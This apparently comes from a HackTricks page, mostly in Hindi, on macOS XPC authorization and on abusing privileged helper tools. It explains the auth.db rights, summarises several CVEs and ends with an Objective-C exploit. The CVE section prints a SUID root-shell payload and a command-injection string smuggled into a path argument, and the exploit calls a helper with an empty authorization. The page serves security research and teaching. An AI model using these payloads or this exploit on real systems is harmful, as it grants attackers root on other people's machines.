# macOS XPC प्राधिकरण

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC प्राधिकरण

Apple एक और तरीका भी प्रस्तावित करता है प्रमाणीकरण का जब कनेक्ट करने वाली प्रक्रिया के पास **permissions to call the an exposed XPC method** हों।

जब किसी application को **execute actions as a privileged user** की आवश्यकता होती है, तो ऐप को privileged user के रूप में चलाने के बजाय सामान्यतः root के रूप में एक HelperTool को एक XPC service के रूप में इंस्टॉल किया जाता है जिसे ऐप से उन क्रियाओं को करने के लिए कॉल किया जा सकता है। हालांकि, सेवा को कॉल करने वाला ऐप के पास पर्याप्त authorization होना चाहिए।

### ShouldAcceptNewConnection हमेशा YES

एक उदाहरण [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample) में मिल सकता है। `App/AppDelegate.m` में यह **connect** करने की कोशिश करता है **HelperTool** से। और `HelperTool/HelperTool.m` में फ़ंक्शन **`shouldAcceptNewConnection`** पहले बताए गए किसी भी requirements की **जाँच नहीं करेगा**। यह हमेशा YES लौटाएगा:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
For more information about how to properly configure this check:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### एप्लिकेशन अधिकार

हालाँकि, जब HelperTool से किसी method को कॉल किया जाता है तो कुछ **authorization हो रहा होता है**।

The function **`applicationDidFinishLaunching`** from `App/AppDelegate.m` will create an empty authorization reference after the app has started. This should always work.\
फिर, यह उस authorization reference में कुछ अधिकार **add करने** की कोशिश करेगी `setupAuthorizationRights` को कॉल करते हुए:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
फ़ंक्शन `setupAuthorizationRights` फाइल `Common/Common.m` से एप्लिकेशन के अधिकारों को प्रमाणीकरण डेटाबेस `/var/db/auth.db` में स्टोर करेगा। ध्यान दें कि यह केवल उन अधिकारों को जोड़ता है जो अभी तक डेटाबेस में मौजूद नहीं हैं:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
फंक्शन `enumerateRightsUsingBlock` वह है जिसका उपयोग applications permissions प्राप्त करने के लिए किया जाता है, जो `commandInfo` में परिभाषित हैं:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
This means that at the end of this process, the permissions declared inside `commandInfo` will be stored in `/var/db/auth.db`. Note how there you can find for **each method** that will r**equire authentication**, **permission name** and the **`kCommandKeyAuthRightDefault`**. The later one **indicates who can get this right**.

There are different scopes to indicate who can access a right. Some of them are defined in [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (you can find [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/)), but as summary:

<table><thead><tr><th width="284.3333333333333">नाम</th><th width="165">मान</th><th>वर्णन</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>कोई भी</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>कोई नहीं</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>वर्तमान user को admin होना चाहिए (admin समूह के अंदर)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>user से authenticate करने के लिए कहें।</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>user से authenticate करने के लिए कहें। उसे admin होना चाहिए (admin समूह के अंदर)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>नियम निर्दिष्ट करें</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>इस right पर कुछ अतिरिक्त टिप्पणियाँ निर्दिष्ट करें</td></tr></tbody></table>

### अधिकार सत्यापन

In `HelperTool/HelperTool.m` the function **`readLicenseKeyAuthorization`** checks if the caller is authorized to **execute such method** calling the function **`checkAuthorization`**. This function will check the **authData** sent by the calling process has a **correct format** and then will check **what is needed to get the right** to call the specific method. If all goes good the **returned `error` will be `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
ध्यान दें कि उस मेथड को कॉल करने का अधिकार पाने की आवश्यकताओं की जाँच करने के लिए फ़ंक्शन `authorizationRightForCommand` केवल पहले बताए गए ऑब्जेक्ट **`commandInfo`** की जाँच करेगा। फिर, यह फ़ंक्शन को कॉल करने के लिए अधिकार होने की जाँच करने के लिए **`AuthorizationCopyRights`** को कॉल करेगा (ध्यान दें कि फ़्लैग्स उपयोगकर्ता के साथ इंटरैक्शन की अनुमति देते हैं)।

इस मामले में, फ़ंक्शन `readLicenseKeyAuthorization` को कॉल करने के लिए `kCommandKeyAuthRightDefault` को `@kAuthorizationRuleClassAllow` पर परिभाषित किया गया है। इसलिए **कोई भी इसे कॉल कर सकता है**।

### DB जानकारी

यह उल्लेख किया गया था कि यह जानकारी `/var/db/auth.db` में स्टोर की जाती है। आप सभी स्टोर किए गए नियमों को निम्न के साथ सूचीबद्ध कर सकते हैं:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
फिर, आप पढ़ सकते हैं कि कौन इस अधिकार तक पहुँच सकता है:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### अनुमत अधिकार

आप **सभी अनुमति विन्यास** [**in here**](https://www.dssw.co.uk/reference/authorization-rights/) में पा सकते हैं, लेकिन वे संयोजन जिनके लिए उपयोगकर्ता इंटरैक्शन की आवश्यकता नहीं होगी, वे होंगे:

1. **'authenticate-user': 'false'**
- यह सबसे सीधी कुंजी है। अगर इसे `false` पर सेट किया गया है, तो यह निर्दिष्ट करता है कि किसी उपयोगकर्ता को यह अधिकार प्राप्त करने के लिए प्रमाणीकरण देने की आवश्यकता नहीं है।
- इसे उपयोग किया जाता है **नीचे के 2 में से किसी एक के साथ संयोजन में या उस समूह को निर्दिष्ट करते हुए** जिसमें उपयोगकर्ता होना चाहिए।
2. **'allow-root': 'true'**
- यदि कोई उपयोगकर्ता root user (जिसके पास elevated permissions हैं) के रूप में कार्य कर रहा है, और यह कुंजी `true` पर सेट है, तो root user संभवतः अतिरिक्त प्रमाणीकरण के बिना यह अधिकार प्राप्त कर सकता है। हालांकि, सामान्यतः root स्थिति तक पहुँचने के लिए पहले से ही प्रमाणीकरण की आवश्यकता होती है, इसलिए अधिकतर उपयोगकर्ताओं के लिए यह एक "बिना प्रमाणीकरण" स्थिति नहीं है।
3. **'session-owner': 'true'**
- यदि `true` पर सेट है, तो session का मालिक (वर्तमान में लॉग-इन किया हुआ उपयोगकर्ता) स्वचालित रूप से यह अधिकार प्राप्त कर लेगा। अगर उपयोगकर्ता पहले से लॉग-इन है तो यह अतिरिक्त प्रमाणीकरण को बायपास कर सकता है।
4. **'shared': 'true'**
- यह कुंजी प्रमाणीकरण के बिना अधिकार प्रदान नहीं करती। बल्कि, यदि यह `true` पर सेट है, तो इसका मतलब है कि एक बार जब अधिकार प्रमाणीकृत हो जाता है, तो इसे कई प्रक्रियाओं के बीच साझा किया जा सकता है बिना प्रत्येक को पुनः प्रमाणीकरण करने की आवश्यकता के। लेकिन अधिकार का प्रारंभिक प्रदान करना तब भी प्रमाणीकरण की आवश्यकता रखेगा जब तक कि इसे `'authenticate-user': 'false'` जैसी अन्य कुंजियों के साथ संयोजित न किया गया हो।

आप [**use this script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) का उपयोग करके दिलचस्प अधिकार प्राप्त कर सकते हैं:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: विशेषाधिकार प्राप्त Mach सेवा `com.acustica.HelperTool` हर कनेक्शन स्वीकार करती है और इसकी `checkAuthorization:` रूटीन `AuthorizationCopyRights(NULL, …)` को कॉल करती है, इसलिए कोई भी 32‑byte ब्लॉब पास हो जाता है। `executeCommand:authorization:withReply:` फिर attacker-controlled comma‑separated strings को root के रूप में `NSTask` में फीड करता है, जिससे निम्न payloads बनते हैं:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
आसानी से SUID root shell बनाया जा सकता है। विवरण इस [this write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/) में।

- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: listener हमेशा YES रिटर्न करता है और वही NULL `AuthorizationCopyRights` पैटर्न `checkAuthorization:` में दिखाई देता है। मेथड `exchangeAppWithReply:` दो बार हमलावर के इनपुट को `system()` स्ट्रिंग में जोड़ता है, इसलिए `appPath` में shell metacharacters इंजेक्ट करने से (उदा. `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) Mach service `com.plugin-alliance.pa-installationhelper` के माध्यम से root code execution हो जाता है। अधिक जानकारी [here](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)।

- **CVE-2024-4395 – Jamf Compliance Editor helper**: ऑडिट चलाने पर `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist` ड्रॉप होता है, Mach service `com.jamf.complianceeditor.helper` एक्सपोज़ होता है, और `-executeScriptAt:arguments:then:` को caller के `AuthorizationExternalForm` या code signature की जाँच किए बिना एक्सपोर्ट किया जाता है। एक सरल exploit `AuthorizationCreate` करके एक खाली reference बनाता है, `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` से कनेक्ट होता है, और arbitrary binaries को root के रूप में execute करने के लिए मेथड को कॉल करता है। पूर्ण रिवर्सिंग नोट्स (और PoC) [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html) में हैं।

- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 और 7.4.0–7.4.2 ऐसे रचित XPC messages स्वीकार करते थे जो privileged helper तक पहुँचते थे जिनमें authorization gates नहीं थे। चूंकि helper अपने privileged `AuthorizationRef` पर भरोसा करता था, कोई भी लोकल यूज़र जो सेवा को message भेज सके, उसे arbitrary configuration बदलाव या कमांड्स root के रूप में चलवाने के लिए मजबूर कर सकता था। विवरण [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/) में हैं।

#### त्वरित ट्रायज सुझाव

- जब किसी ऐप के साथ GUI और helper दोनों होते हैं, तो उनके code requirements का diff करें और जाँच करें कि क्या `shouldAcceptNewConnection` listener को `-setCodeSigningRequirement:` के साथ लॉक करता है (या `SecCodeCopySigningInformation` को वैलिडेट करता है)। चेक्स की कमी आमतौर पर Jamf केस जैसी CWE-863 स्थितियों को जन्म देती है। एक त्वरित नज़र कुछ इस तरह दिखती है:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Compare what the helper *thinks* it is authorizing with what the client supplies. When reversing, break on `AuthorizationCopyRights` and confirm the `AuthorizationRef` originates from `AuthorizationCreateFromExternalForm` (client provided) instead of the helper’s own privileged context, otherwise you likely found a CWE-863 pattern similar to the cases above.

## रिवर्सिंग ऑथराइज़ेशन

### यह जांचना कि EvenBetterAuthorization उपयोग हो रहा है

If you find the function: **`[HelperTool checkAuthorization:command:]`** it's probably the the process is using the previously mentioned schema for authorization:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Thisn, if this function is calling functions such as `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, it's using [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Check the **`/var/db/auth.db`** to see if it's possible to get permissions to call some privileged action without user interaction.

### प्रोटोकॉल संचार

Then, you need to find the protocol schema in order to be able to establish a communication with the XPC service.

The function **`shouldAcceptNewConnection`** indicates the protocol being exported:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

In this case, we have the same as in EvenBetterAuthorizationSample, [**check this line**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Knowing, the name of the used protocol, it's possible to **dump its header definition** with:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
अंत में, इसके साथ संचार स्थापित करने के लिए हमें केवल **प्रकट किए गए Mach Service का नाम** जानना होगा। इसे खोजने के कई तरीके हैं:

- **`[HelperTool init]`** में जहाँ आप Mach Service के उपयोग को देख सकते हैं:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- launchd plist में:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit Example

इस उदाहरण में निम्न बनाए गए हैं:

- फ़ंक्शनों के साथ प्रोटोकॉल की परिभाषा
- एक खाली auth जिसका उपयोग पहुँच के लिए अनुरोध करने में किया जाता है
- XPC सेवा के लिए एक कनेक्शन
- यदि कनेक्शन सफल हुआ तो फ़ंक्शन को कॉल करना
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## अन्य XPC विशेषाधिकार हेल्पर्स का दुरुपयोग

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## संदर्भ

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)

{{#include ../../../../../banners/hacktricks-training.md}}
